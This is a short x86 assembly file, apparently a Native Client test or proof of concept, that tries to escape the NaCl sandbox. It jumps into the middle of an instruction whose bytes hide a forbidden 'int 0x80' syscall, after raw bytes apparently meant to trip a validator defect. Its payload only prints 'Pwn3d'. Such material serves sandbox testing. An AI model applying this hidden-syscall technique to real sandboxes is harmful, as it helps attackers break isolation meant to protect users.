/* To build:                                                      */
/*   tools_bin/nacl-sdk/nacl/bin/as -o vmdefect.o vmdefect.s      */
/*   tools_bin/nacl-sdk/nacl/bin/ld -o vmdefect.nexe vmdefect.o   */


.intel_syntax noprefix
.section .data
msg: .asciz "Pwn3d\n"
.section .text
.global _start
_start:
   mov eax, 4
   mov ebx, 1
   lea ecx, msg
   mov edx, 6
   nop
   nop
   nop
   nop
   lea esi, pwned+1
   push esi
   .byte 0x0f
   .byte 0x72
   .byte 0x24
   .byte 0x2e
   ret
pwned:
   mov ebx,0x80cd9090
